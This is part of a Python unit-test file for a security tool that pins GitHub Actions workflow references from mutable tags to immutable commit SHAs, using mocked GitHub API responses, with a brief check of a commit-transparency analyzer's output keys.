        for key in ('status', 'is_deceptive', 'matched_keyword', 'directive',
                    'mci_score', 'signals', 'semantic_claim', 'diff_reality'):
            self.assertIn(key, result)

    def test_unverified_result_contains_required_keys(self):
        ana = SemanticTransparencyAnalyzer('', diffs=[])
        result = ana.analyze_transparency()
        for key in ('status', 'is_deceptive', 'matched_keyword', 'directive',
                    'mci_score', 'signals', 'semantic_claim', 'diff_reality'):
            self.assertIn(key, result)


class TestWorkflowRemediation(unittest.TestCase):
    """Stage 1 auto-remediation: mutable action tag → immutable SHA pinning."""

    def setUp(self):
        from remediate import WorkflowRemediator, RemediationTarget
        self.WorkflowRemediator = WorkflowRemediator
        self.RemediationTarget = RemediationTarget
        self.remediator = WorkflowRemediator(token='ghp_fake', cache_path='/tmp/pg-test-cache.json')
        # Start each test with a clean cache
        self.remediator._cache = {}

    # --- _extract_mutable_refs ---

    def test_already_pinned_sha_skipped(self):
        content = "steps:\n  - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd\n"
        targets = self.remediator._extract_mutable_refs('.github/workflows/ci.yml', content)
        self.assertEqual(targets, [])

    def test_mutable_tag_detected(self):
        content = "steps:\n  - uses: actions/checkout@v4\n"
        targets = self.remediator._extract_mutable_refs('.github/workflows/ci.yml', content)
        self.assertEqual(len(targets), 1)
        self.assertEqual(targets[0].action, 'actions/checkout')
        self.assertEqual(targets[0].current_ref, 'v4')
        self.assertEqual(targets[0].original_uses, 'actions/checkout@v4')

    def test_local_path_ref_skipped(self):
        content = "steps:\n  - uses: ./.github/actions/my-action\n"
        targets = self.remediator._extract_mutable_refs('.github/workflows/ci.yml', content)
        self.assertEqual(targets, [])

    def test_ref_without_at_sign_skipped(self):
        content = "steps:\n  - uses: actions/checkout\n"
        targets = self.remediator._extract_mutable_refs('.github/workflows/ci.yml', content)
        self.assertEqual(targets, [])

    def test_first_party_action_flagged_as_first_party(self):
        content = "steps:\n  - uses: actions/setup-python@v5\n"
        targets = self.remediator._extract_mutable_refs('.github/workflows/ci.yml', content)
        self.assertEqual(len(targets), 1)
        self.assertTrue(targets[0].is_first_party)

    def test_third_party_action_not_first_party(self):
        content = "steps:\n  - uses: aws-actions/configure-aws-credentials@v4\n"
        targets = self.remediator._extract_mutable_refs('.github/workflows/ci.yml', content)
        self.assertEqual(len(targets), 1)
        self.assertFalse(targets[0].is_first_party)

    def test_duplicate_refs_deduplicated(self):
        content = (
            "steps:\n"
            "  - uses: actions/checkout@v4\n"
            "  - uses: actions/checkout@v4\n"
        )
        targets = self.remediator._extract_mutable_refs('.github/workflows/ci.yml', content)
        self.assertEqual(len(targets), 1)

    def test_step_name_tracked(self):
        content = (
            "steps:\n"
            "  - name: Checkout code\n"
            "    uses: actions/checkout@v4\n"
        )
        targets = self.remediator._extract_mutable_refs('.github/workflows/ci.yml', content)
        self.assertEqual(len(targets), 1)
        self.assertEqual(targets[0].step_name, 'Checkout code')

    def test_multiple_distinct_refs_all_detected(self):
        content = (
            "steps:\n"
            "  - uses: actions/checkout@v4\n"
            "  - uses: actions/setup-python@v5\n"
        )
        targets = self.remediator._extract_mutable_refs('.github/workflows/ci.yml', content)
        self.assertEqual(len(targets), 2)

    # --- resolve_sha ---

    def test_already_sha_returns_none(self):
        result = self.remediator.resolve_sha('actions/checkout', 'a' * 40)
        self.assertIsNone(result)

    def test_resolve_lightweight_tag(self):
        fake_response = json.dumps({
            'object': {'type': 'commit', 'sha': 'b' * 40}
        }).encode()
        with patch('urllib.request.urlopen') as mock_open:
            ctx = MagicMock()
            ctx.__enter__ = MagicMock(return_value=ctx)
            ctx.__exit__ = MagicMock(return_value=False)
            ctx.read.return_value = fake_response
            mock_open.return_value = ctx
            result = self.remediator.resolve_sha('actions/checkout', 'v4')
        self.assertIsNotNone(result)
        self.assertEqual(result.resolved_sha, 'b' * 40)
        self.assertEqual(result.ref_type, 'tag')
        self.assertEqual(result.error, '')

    def test_resolve_annotated_tag_dereferences(self):
        # First call returns annotated tag object; second dereferences to commit
        responses = [
            json.dumps({'object': {'type': 'tag', 'sha': 'tag_sha_000'}}).encode(),
            json.dumps({'object': {'type': 'commit', 'sha': 'c' * 40}}).encode(),
        ]
        call_count = [0]

        def fake_urlopen(req, timeout=None):
            ctx = MagicMock()
            ctx.__enter__ = MagicMock(return_value=ctx)
            ctx.__exit__ = MagicMock(return_value=False)
            ctx.read.return_value = responses[call_count[0]]
            call_count[0] += 1
            return ctx

        with patch('urllib.request.urlopen', side_effect=fake_urlopen):
            result = self.remediator.resolve_sha('actions/checkout', 'v4.1.0')

        self.assertEqual(call_count[0], 2)
        self.assertEqual(result.resolved_sha, 'c' * 40)
        self.assertEqual(result.ref_type, 'tag')

    def test_branch_ref_warns_and_not_tag(self):
        import urllib.error
        # First call: 404 (tag not found)
        # Second call: branch found
        branch_sha = 'd' * 40
        responses = [
            json.dumps({'object': {'sha': branch_sha}}).encode(),
        ]

        def fake_urlopen(req, timeout=None):
            url = req.get_full_url()
            if '/git/ref/tags/' in url:
                raise urllib.error.HTTPError(url, 404, 'Not Found', {}, None)
            ctx = MagicMock()
            ctx.__enter__ = MagicMock(return_value=ctx)
            ctx.__exit__ = MagicMock(return_value=False)
            ctx.read.return_value = responses[0]
            return ctx

        with patch('urllib.request.urlopen', side_effect=fake_urlopen):
            result = self.remediator.resolve_sha('actions/checkout', 'main')

        self.assertEqual(result.ref_type, 'branch')
        self.assertIn('branch', result.error.lower())
        self.assertEqual(result.resolved_sha, branch_sha)

    def test_sha_cache_prevents_duplicate_api_calls(self):
        fake_response = json.dumps({
            'object': {'type': 'commit', 'sha': 'e' * 40}
        }).encode()
        call_count = [0]

        def fake_urlopen(req, timeout=None):
            call_count[0] += 1
            ctx = MagicMock()
            ctx.__enter__ = MagicMock(return_value=ctx)
            ctx.__exit__ = MagicMock(return_value=False)
            ctx.read.return_value = fake_response
            return ctx

        with patch('urllib.request.urlopen', side_effect=fake_urlopen):
            self.remediator.resolve_sha('actions/checkout', 'v4')
            self.remediator.resolve_sha('actions/checkout', 'v4')

        self.assertEqual(call_count[0], 1)

    # --- patch_workflow ---

    def test_yaml_patch_substitutes_sha(self):
        content = "steps:\n  - uses: actions/checkout@v4\n"
        t = self.RemediationTarget(
            file='.github/workflows/ci.yml',
            step_name='Checkout',
            action='actions/checkout',
            current_ref='v4',
            resolved_sha='a' * 40,
            original_uses='actions/checkout@v4',
            ref_type='tag',
        )
        patched = self.remediator.patch_workflow(content, [t])
        self.assertIn('a' * 40, patched)
        self.assertIn('# v4', patched)
        self.assertNotIn('@v4', patched)

    def test_patch_preserves_other_lines(self):
        content = (
            "name: CI\n"
            "on: [push]\n"
            "jobs:\n"
            "  build:\n"
            "    steps:\n"
            "      - uses: actions/checkout@v4\n"
            "      - run: echo hello\n"
        )
        t = self.RemediationTarget(
            file='ci.yml', step_name='',
            action='actions/checkout', current_ref='v4',
            resolved_sha='a' * 40, original_uses='actions/checkout@v4',
            ref_type='tag',
        )
        patched = self.remediator.patch_workflow(content, [t])
        self.assertIn('name: CI', patched)
        self.assertIn('run: echo hello', patched)

    def test_patch_branch_ref_not_substituted(self):
        content = "steps:\n  - uses: actions/checkout@main\n"
        t = self.RemediationTarget(
            file='ci.yml', step_name='',
            action='actions/checkout', current_ref='main',
            resolved_sha='f' * 40, original_uses='actions/checkout@main',
            ref_type='branch',
        )
        patched = self.remediator.patch_workflow(content, [t])
        # Branch refs must NOT be substituted — they remain mutable regardless
        self.assertIn('@main', patched)

    def test_patch_no_op_when_no_subs(self):
        content = "steps:\n  - uses: actions/checkout@" + 'a' * 40 + "\n"
        patched = self.remediator.patch_workflow(content, [])
        self.assertEqual(content, patched)

    # --- mutable_tag_warnings in analyze.py report ---

    def test_mutable_tag_warnings_key_present_in_report(self):
        from analyze import _scan_mutable_action_refs
        # Build a fake diff with a mutable ref
        blob = MagicMock()
        blob.data_stream.read.return_value = (
            b"steps:\n  - uses: actions/checkout@v4\n"
        )
        d = MagicMock()
        d.change_type = 'A'
        d.b_path = '.github/workflows/ci.yml'
        d.b_blob = blob
        result = _scan_mutable_action_refs([d])
        self.assertEqual(len(result), 1)
        self.assertEqual(result[0]['action'], 'actions/checkout')
        self.assertEqual(result[0]['ref'], 'v4')

    def test_mutable_tag_warnings_skips_sha_pinned(self):
        from analyze import _scan_mutable_action_refs
        sha = 'a' * 40
        blob = MagicMock()
        blob.data_stream.read.return_value = (
            f"steps:\n  - uses: actions/checkout@{sha}\n".encode()
        )
        d = MagicMock()
        d.change_type = 'A'
        d.b_path = '.github/workflows/ci.yml'
        d.b_blob = blob
        result = _scan_mutable_action_refs([d])
        self.assertEqual(result, [])

    def test_mutable_tag_warnings_skips_deleted_diffs(self):
        from analyze import _scan_mutable_action_refs
        d = MagicMock()
        d.change_type = 'D'
        d.b_path = '.github/workflows/ci.yml'
        result = _scan_mutable_action_refs([d])
        self.assertEqual(result, [])


if __name__ == "__main__":
    unittest.main()
